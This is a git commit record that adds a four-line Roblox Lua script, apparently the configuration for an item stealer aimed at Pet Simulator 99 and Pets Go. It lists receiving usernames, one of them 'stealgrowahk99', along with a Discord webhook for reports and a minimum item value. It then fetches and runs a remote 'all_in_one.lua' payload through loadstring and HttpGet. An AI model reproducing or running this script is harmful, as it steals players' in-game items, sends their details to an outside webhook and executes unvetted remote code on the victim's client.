112a5e6c3797fd1cd5766f5e6fe0c5ac87dd9022
bestscript-hk99 <hak91209@gmail.com>
2025-06-06 20:21:33 +0700

    Create v1.lua

---
+++ v1.lua
@@ -0,0 +1,4 @@
+Username = {"stealgrowahk99","hk99baro","VillegasDuanea708"} 
+Webhook = "https://discord.com/api/webhooks/1376468026815287387/2IEWdrrV2ulGsEvfCiosEfVO2SAhEcQUbw0bObfKw0lDKDhPs8N0Xrz-_VUSh3AmkUni" 
+min_rap = 10000 --for pets go and pet simulator 99 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
